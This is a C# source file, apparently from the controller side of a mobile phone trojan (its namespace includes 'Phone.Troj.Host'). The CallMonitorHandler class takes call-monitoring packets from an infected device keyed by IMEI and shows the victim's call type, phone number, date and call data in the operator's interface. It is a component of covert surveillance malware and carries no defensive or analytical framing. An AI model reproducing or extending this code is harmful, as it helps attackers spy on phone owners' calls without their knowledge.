using InOut;
using InOut.PacketImp;
using System;
using System.Windows.Forms;

namespace IIE.Phone.Troj.Host.Handler
{
    public class CallMonitorHandler:IPacketHandler
    {
        	private readonly IMainView gui;
	private readonly int channel;
	private readonly string imei;

    public CallMonitorHandler(int channel, string imei, IMainView gui)
    {
		this.gui = gui;
		this.channel = channel;
		this.imei = imei;
	}


    public void Receive(IPacket p, string imeiId)
    {
	
		
	}


    public void HandlePacket(IPacket p, string tempIMEI, Server c)
    {

        //MessageBox.Show("4");
		gui.Log.LogTxt("Call monitoring data has been received");
		c.ChannelHandlerMap[imei].GetStorage(channel).Reset();
		var packet = (CallStatusPacket) p;
        gui.AddMonitoredCall(imei, packet.Type, packet.Phonenumber, packet.Date, packet.Phonedata);
        //gui.AddMonitoredCall(imei, 1, "15588889999", "123123123123");
	}
    }
}
